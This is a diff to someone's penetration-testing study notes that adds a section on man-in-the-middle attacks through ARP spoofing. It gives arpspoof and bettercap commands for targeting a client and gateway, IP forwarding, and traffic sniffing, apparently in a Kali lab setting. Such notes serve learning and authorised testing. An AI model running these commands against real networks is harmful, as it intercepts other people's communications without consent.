@@ -129,7 +129,31 @@ sudo netdiscover -r 192.168.1.1/24
 *** Use nmap/zenmap many more Information
 
 
-*** Man in the middle attach => interecept the network in the middle
+*** Man in the middle attach => interecept the communications in the middle
 
+Use ARP request attach
+
+***ARP asks who the this IP and send me back the MAC address
+
+arpspoof -i [interface] -t [clientIP] [gatewayIP]
+
+
+to enable port forwording on Kali
+
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+
+*** Using bettercap
+
+sudo bettercap -iface eth0
+
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets 10.0.2.6
+arp.spoof on
+set net.sniff.local true
+net.sniff on
+
+sudo bettercap -iface eth0 -caplet spoof.cap
 
 
